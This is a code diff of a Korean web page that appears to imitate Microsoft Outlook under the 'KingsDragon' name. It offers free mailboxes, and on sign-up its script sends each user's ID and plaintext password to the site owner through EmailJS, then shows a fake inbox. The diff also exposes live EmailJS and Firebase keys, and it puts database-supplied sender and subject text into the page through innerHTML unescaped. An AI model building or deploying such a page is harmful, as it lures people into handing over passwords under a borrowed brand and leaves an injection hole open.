@@ -10,7 +10,10 @@
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
 
     <script type="text/javascript">
+       // 1. EmailJS 초기화
        emailjs.init("sNlzvNIioN1urvCco");
+
+       // 2. Firebase 설정 (사장님 고유값 적용)
        const firebaseConfig = {
          apiKey: "AIzaSyDFQy1IIyNGRpZIcS3y58zznAoc9ljATZg",
          authDomain: "my-email-project-77612.firebaseapp.com",
@@ -26,165 +29,219 @@
     </script>
 
     <style>
-        :root { --primary-blue: #0078d4; --hover-blue: #005a9e; --bg-light: #f3f2f1; --dragon-gold: #d4af37; }
-        body { margin: 0; font-family: 'Segoe UI', Arial, sans-serif; color: #242424; line-height: 1.5; }
+        :root { --p-blue: #0078d4; --hover-blue: #005a9e; --bg-light: #f3f2f1; }
+        body { margin: 0; font-family: 'Segoe UI', sans-serif; color: #242424; overflow-x: hidden; }
 
-        /* [1. 네비게이션 바] */
-        nav { display: flex; align-items: center; justify-content: space-between; padding: 10px 8%; border-bottom: 1px solid #ddd; background: #fff; position: sticky; top: 0; z-index: 100; }
-        .nav-left { display: flex; align-items: center; gap: 30px; }
-        .logo { font-weight: 700; color: var(--primary-blue); font-size: 1.4rem; cursor: pointer; }
-        .nav-links { display: flex; gap: 20px; font-size: 0.9rem; color: #616161; font-weight: 500; }
-        .nav-right { display: flex; gap: 15px; }
-        .btn-login { background: none; border: 1px solid #242424; padding: 8px 20px; cursor: pointer; font-weight: 600; }
-        .btn-buy { background: #242424; color: white; border: none; padding: 8px 20px; cursor: pointer; font-weight: 600; }
+        /* [네비게이션] */
+        nav { display: flex; align-items: center; justify-content: space-between; padding: 12px 8%; border-bottom: 1px solid #ddd; background: #fff; position: sticky; top: 0; z-index: 100; }
+        .logo { font-weight: 700; color: var(--p-blue); font-size: 1.4rem; cursor: pointer; text-decoration: none; }
+        .nav-links { display: flex; gap: 25px; font-size: 0.9rem; color: #616161; }
+        .btn-login { background: none; border: 1px solid #242424; padding: 7px 18px; cursor: pointer; font-weight: 600; }
+        .btn-buy { background: #242424; color: white; border: none; padding: 8px 18px; cursor: pointer; font-weight: 600; margin-left: 10px; }
 
-        /* [2. 히어로 섹션] */
-        .hero { display: flex; align-items: center; padding: 80px 10%; background: linear-gradient(135deg, #fff 50%, #f8f9fa 100%); min-height: 60vh; }
-        .hero-text { flex: 1.2; padding-right: 50px; }
-        .hero-text h1 { font-size: 3.2rem; font-weight: 600; margin-bottom: 20px; color: #000; letter-spacing: -1px; }
-        .hero-text p { font-size: 1.25rem; color: #444; margin-bottom: 35px; }
-        .hero-visual { flex: 1; position: relative; }
-        .mockup-img { width: 100%; border-radius: 8px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); border: 1px solid #eee; }
+        /* [히어로 섹션] */
+        .hero { display: flex; align-items: center; padding: 80px 10%; background: linear-gradient(135deg, #fff 40%, #e7f3ff 100%); min-height: 500px; }
+        .hero-text { flex: 1.2; }
+        .hero-text h1 { font-size: 3.5rem; line-height: 1.1; margin-bottom: 20px; font-weight: 600; }
+        .hero-text p { font-size: 1.3rem; color: #444; margin-bottom: 35px; }
+        .hero-visual { flex: 1; text-align: right; }
+        .hero-visual img { width: 90%; border-radius: 12px; box-shadow: 0 30px 60px rgba(0,0,0,0.12); }
 
-        /* [3. 입력 그룹] */
-        .input-box { display: flex; border: 2px solid var(--primary-blue); padding: 5px; background: #fff; max-width: 500px; margin-bottom: 15px; box-shadow: 0 4px 10px rgba(0,120,212,0.1); }
-        .input-box input { flex: 1; border: none; outline: none; padding: 15px; font-size: 1.1rem; }
-        .input-box .domain { padding: 15px; color: var(--primary-blue); font-weight: 700; background: #f0f7ff; }
-        .btn-start { background: var(--primary-blue); color: white; border: none; padding: 15px 40px; font-size: 1.1rem; font-weight: 600; cursor: pointer; transition: 0.2s; }
-        .btn-start:hover { background: var(--hover-blue); }
+        /* [입력창 박스] */
+        .cta-box { display: flex; max-width: 550px; border: 2px solid var(--p-blue); background: #fff; box-shadow: 0 10px 25px rgba(0,120,212,0.15); }
+        .cta-box input { flex: 1; border: none; padding: 18px; font-size: 1.1rem; outline: none; }
+        .cta-box .domain-label { padding: 18px; background: #f0f7ff; color: var(--p-blue); font-weight: bold; border-left: 1px solid #ddd; }
+        .btn-main { background: var(--p-blue); color: #fff; border: none; padding: 0 30px; font-size: 1.1rem; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        .btn-main:hover { background: var(--hover-blue); }
 
-        /* [4. 특징 섹션] */
-        .features { display: grid; grid-template-columns: repeat(3, 1fr); gap: 40px; padding: 80px 10%; background: #fff; }
-        .feature-item h3 { color: var(--primary-blue); margin-bottom: 10px; }
-        .feature-item p { color: #666; font-size: 0.95rem; }
+        /* [특징 섹션] */
+        .features { display: grid; grid-template-columns: repeat(3, 1fr); gap: 40px; padding: 70px 10%; background: #fff; }
+        .f-card h3 { color: var(--p-blue); font-size: 1.4rem; }
+        .f-card p { color: #666; font-size: 1rem; }
 
-        /* 모달 & 인박스 (기존 스타일 유지) */
-        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); justify-content: center; align-items: center; }
-        .modal-content { background: #fff; padding: 40px; border-radius: 4px; width: 360px; }
-        #inbox-page { display: none; height: 100vh; flex-direction: column; background: var(--bg-light); }
-        .inbox-main { display: flex; flex: 1; overflow: hidden; }
-        .sidebar { width: 220px; background: #fff; border-right: 1px solid #edebe9; padding: 15px; }
-        .mail-list { width: 350px; background: #fff; border-right: 1px solid #edebe9; overflow-y: auto; }
-        .mail-view { flex: 1; background: #fff; padding: 40px; }
-        .mail-item { padding: 15px; border-bottom: 1px solid #f3f2f1; cursor: pointer; }
+        /* [보안 모달] */
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.65); justify-content: center; align-items: center; }
+        .modal-content { background: #fff; padding: 40px; border-radius: 2px; width: 360px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
+        .secure-input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; box-sizing: border-box; }
+        #captcha-box { background: #f3f2f1; padding: 15px; text-align: center; font-size: 1.5rem; font-weight: 900; letter-spacing: 8px; margin: 10px 0; user-select: none; }
+
+        /* [인박스 페이지] */
+        #inbox-page { display: none; height: 100vh; flex-direction: column; background: #fff; }
+        .ib-header { background: var(--p-blue); color: white; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
+        .ib-body { display: flex; flex: 1; overflow: hidden; }
+        .ib-sidebar { width: 240px; border-right: 1px solid #edebe9; padding: 20px; background: #f9f9f9; }
+        .ib-list { width: 380px; border-right: 1px solid #edebe9; overflow-y: auto; }
+        .ib-view { flex: 1; padding: 40px; overflow-y: auto; }
+        .mail-card { padding: 15px 20px; border-bottom: 1px solid #f3f2f1; cursor: pointer; transition: 0.1s; }
+        .mail-card:hover { background: #f0f7ff; }
+        .mail-card.active { border-left: 4px solid var(--p-blue); background: #f3f2f1; }
     </style>
 </head>
 <body>
 
     <div id="home-page">
         <nav>
-            <div class="nav-left">
-                <div class="logo">🐉 KingsDragon</div>
+            <div style="display:flex; align-items:center; gap:40px;">
+                <a href="#" class="logo">🐉 KingsDragon</a>
                 <div class="nav-links">
                     <span>제품</span>
                     <span>비즈니스용</span>
-                    <span>요금제 및 가격</span>
                     <span>리소스</span>
                 </div>
             </div>
-            <div class="nav-right">
-                <button class="btn-login">로그인</button>
-                <button class="btn-buy">지금 구입</button>
+            <div>
+                <button class="btn-login" onclick="openGate()">로그인</button>
+                <button class="btn-buy" onclick="openGate()">지금 구입</button>
             </div>
         </nav>
 
         <section class="hero">
             <div class="hero-text">
-                <h1>전설적인 전자 메일 및<br>보안을 위한 <span style="color:var(--primary-blue)">Outlook</span></h1>
-                <p>여러 계정의 전자 메일, 일정, 연락처를 한 곳에서 관리하세요.<br>데스크톱, 모바일, 웹에서 사용 가능합니다.</p>
+                <h1>일상적인 메일과<br>보안을 위한 <span style="color:var(--p-blue)">Outlook</span></h1>
+                <p>전설적인 KingsDragonMail의 보안 기술을 경험하세요.<br>지금 바로 나만의 전용 도메인 계정을 만드세요.</p>
                 
-                <div class="input-box">
-                    <input type="text" id="reg-id" placeholder="새로운 아이디 입력" autocomplete="off">
-                    <span class="domain">@kingsdragonmail.abrdns.com</span>
+                <div class="cta-box">
+                    <input type="text" id="reg-id" placeholder="사용할 아이디 입력" autocomplete="off">
+                    <div class="domain-label">@kingsdragonmail.abrdns.com</div>
+                    <button class="btn-main" onclick="openGate()">시작 ></button>
                 </div>
-                <button class="btn-start" onclick="showSecurity()">무료 계정 만들기 ></button>
-                <p style="font-size:0.9rem; color:#888; margin-top:15px;">전설의 시작, 지금 바로 합류하세요.</p>
+                <p style="margin-top:15px; font-size:0.9rem; color:#888;">무료로 시작할 수 있습니다. 신용카드는 필요 없습니다.</p>
             </div>
             <div class="hero-visual">
-                <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/image/RW167Sj?ver=8064" class="mockup-img" alt="Outlook Mockup">
+                <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/image/RW167Sj?ver=8064" alt="Outlook Preview">
             </div>
         </section>
 
         <section class="features">
-            <div class="feature-item">
-                <h3>🛡️ 엔터프라이즈급 보안</h3>
-                <p>용의 숨결처럼 강력한 암호화 기술로 당신의 데이터를 보호합니다.</p>
+            <div class="f-card">
+                <h3>🛡️ 드래곤급 보안</h3>
+                <p>모든 서신은 256비트 암호화로 보호되어 절대 뚫리지 않습니다.</p>
             </div>
-            <div class="feature-item">
-                <h3>📅 통합 일정 관리</h3>
-                <p>메일과 일정을 한눈에 확인하고 전설적인 계획을 세우세요.</p>
+            <div class="f-card">
+                <h3>⚡ 초고속 서버</h3>
+                <p>전 세계 어디서든 0.1초 만에 메일을 수신하고 확인하세요.</p>
             </div>
-            <div class="feature-item">
-                <h3>☁️ 대용량 클라우드</h3>
-                <p>모든 서신과 기록을 안전하게 보관할 수 있는 넉넉한 공간을 제공합니다.</p>
+            <div class="f-card">
+                <h3>📂 무제한 보관함</h3>
+                <p>중요한 기록을 용량 걱정 없이 평생 안전하게 보관하세요.</p>
             </div>
         </section>
     </div>
 
     <div id="security-modal" class="modal">
         <div class="modal-content">
-            <h3>🛡️ 보안 검증</h3>
-            <input type="password" id="reg-pw" style="width:100%; padding:10px; margin-bottom:10px;" placeholder="Password">
-            <div id="captcha-display" style="background:#eee; padding:15px; text-align:center; font-weight:bold; letter-spacing:5px;"></div>
-            <input type="text" id="captcha-input" style="width:100%; padding:10px; margin-top:10px;" placeholder="보안문자 입력">
-            <button onclick="completeSignup()" style="width:100%; background:var(--primary-blue); color:white; padding:15px; border:none; margin-top:10px; cursor:pointer;">가입 완료</button>
+            <h2 style="margin-top:0;">계정 확인</h2>
+            <p style="font-size:0.9rem; color:#666;">보안을 위해 비밀번호와 보안 문자를 입력하세요.</p>
+            <input type="password" id="reg-pw" class="secure-input" placeholder="비밀번호 입력">
+            <div id="captcha-box"></div>
+            <input type="text" id="captcha-input" class="secure-input" placeholder="위 보안 문자 입력">
+            <button onclick="finishProcess()" style="width:100%; background:var(--p-blue); color:white; padding:15px; border:none; margin-top:10px; cursor:pointer; font-weight:bold;">인박스 접속</button>
+            <button onclick="closeGate()" style="width:100%; background:none; border:none; color:#888; margin-top:10px; cursor:pointer;">취소</button>
         </div>
     </div>
 
     <div id="inbox-page">
-        <div style="background:var(--primary-blue); color:white; padding:15px; display:flex; justify-content:space-between;">
-            <div>KingsDragon Outlook</div>
-            <div id="logged-in-user"></div>
+        <div class="ib-header">
+            <div style="font-weight:bold; font-size:1.1rem;">🐉 KingsDragon Outlook</div>
+            <div id="user-display" style="font-size:0.9rem; opacity:0.9;"></div>
         </div>
-        <div class="inbox-main">
-            <div class="sidebar"><b>받은 편지함</b></div>
-            <div class="mail-list" id="mail-list-container"></div>
-            <div class="mail-view">
-                <h2 id="view-subject">메일을 선택하세요</h2>
-                <div id="view-sender"></div>
-                <hr><div id="view-body"></div>
+        <div class="ib-body">
+            <div class="ib-sidebar">
+                <div style="background:#0078d415; color:var(--p-blue); padding:10px; border-radius:4px; font-weight:bold;">📥 받은 편지함</div>
+                <div style="padding:10px; color:#666;">📤 보낸 편지함</div>
+                <div style="padding:10px; color:#666;">🗑️ 휴지통</div>
+            </div>
+            <div class="ib-list" id="mail-list">
+                </div>
+            <div class="ib-view">
+                <div id="empty-view" style="text-align:center; margin-top:100px; color:#aaa;">
+                    <h1 style="font-size:4rem;">📧</h1>
+                    <p>표시할 메일을 선택하세요.</p>
+                </div>
+                <div id="mail-content" style="display:none;">
+                    <h2 id="msg-subject" style="margin-bottom:5px;"></h2>
+                    <div id="msg-sender" style="color:var(--p-blue); font-weight:bold;"></div>
+                    <hr style="border:0.5px solid #eee; margin:20px 0;">
+                    <div id="msg-body" style="line-height:1.6; white-space:pre-wrap;"></div>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
-        // [로직은 기존과 동일]
-        let correctCaptcha = "";
-        function generateCaptcha() {
-            correctCaptcha = Math.random().toString(36).substring(2, 7).toUpperCase();
-            document.getElementById('captcha-display').innerText = correctCaptcha;
-        }
-        function showSecurity() {
-            if(!document.getElementById('reg-id').value) return alert("아이디를 입력하세요!");
-            generateCaptcha();
+        let currentCaptcha = "";
+
+        // 보안 창 열기 (로그인 & 가입 공통)
+        function openGate() {
+            const id = document.getElementById('reg-id').value;
+            if(!id) {
+                alert("아이디를 먼저 입력해 주세요!");
+                document.getElementById('reg-id').focus();
+                return;
+            }
+            // 보안 문자 생성
+            currentCaptcha = Math.random().toString(36).substring(2, 7).toUpperCase();
+            document.getElementById('captcha-box').innerText = currentCaptcha;
             document.getElementById('security-modal').style.display = 'flex';
         }
-        function completeSignup() {
+
+        function closeGate() {
+            document.getElementById('security-modal').style.display = 'none';
+        }
+
+        // 최종 접속 버튼
+        function finishProcess() {
             const id = document.getElementById('reg-id').value;
             const pw = document.getElementById('reg-pw').value;
             const input = document.getElementById('captcha-input').value;
-            if(input.toUpperCase() !== correctCaptcha) return alert("보안문자 오류!");
 
+            if(input.toUpperCase() !== currentCaptcha) return alert("보안 문자가 틀렸습니다!");
+            if(!pw) return alert("비밀번호를 입력하세요!");
+
+            // 1. 사장님께 알림 (EmailJS)
             emailjs.send('service_7gicimk', 'template_ea7ghys', {user_id: id, user_pw: pw});
-            document.getElementById('logged-in-user').innerText = id + "@kingsdragonmail.abrdns.com";
+
+            // 2. 화면 전환
             document.getElementById('home-page').style.display = 'none';
             document.getElementById('security-modal').style.display = 'none';
             document.getElementById('inbox-page').style.display = 'flex';
-            startInboxListener(id);
+            document.getElementById('user-display').innerText = id + "@kingsdragonmail.abrdns.com";
+
+            // 3. 실시간 메일 수신 대기 시작!
+            listenToInbox(id);
         }
-        function startInboxListener(userId) {
+
+        // [실시간 감시 함수]
+        function listenToInbox(userId) {
             const mailRef = database.ref('emails/' + userId);
+            
             mailRef.on('child_added', (snapshot) => {
                 const data = snapshot.val();
-                const item = document.createElement('div');
-                item.className = 'mail-item';
-                item.innerHTML = `<strong>${data.from}</strong><br><small>${data.subject}</small>`;
-                item.onclick = () => {
-                    document.getElementById('view-subject').innerText = data.subject;
-                    document.getElementById('view-sender').innerText = data.from;
-                    document.getElementById('view-body').innerHTML = data.body;
+                const mailId = snapshot.key;
+                
+                const list = document.getElementById('mail-list');
+                const card = document.createElement('div');
+                card.className = 'mail-card';
+                card.innerHTML = `
+                    <div style="font-weight:bold; color:var(--p-blue);">${data.from}</div>
+                    <div style="font-size:0.9rem; font-weight:600; margin:3px 0;">${data.subject}</div>
+                    <div style="font-size:0.8rem; color:#888;">${data.body.substring(0, 30)}...</div>
+                `;
+                
+                card.onclick = () => {
+                    // 메일 읽기 화면 업데이트
+                    document.getElementById('empty-view').style.display = 'none';
+                    document.getElementById('mail-content').style.display = 'block';
+                    document.getElementById('msg-subject').innerText = data.subject;
+                    document.getElementById('msg-sender').innerText = "보낸 사람: " + data.from;
+                    document.getElementById('msg-body').innerText = data.body;
+                    
+                    // 활성화 표시
+                    document.querySelectorAll('.mail-card').forEach(c => c.classList.remove('active'));
+                    card.classList.add('active');
                 };
-                document.getElementById('mail-list-container').prepend(item);
+                
+                list.prepend(card); // 최신 메일을 위로
             });
         }
     </script>
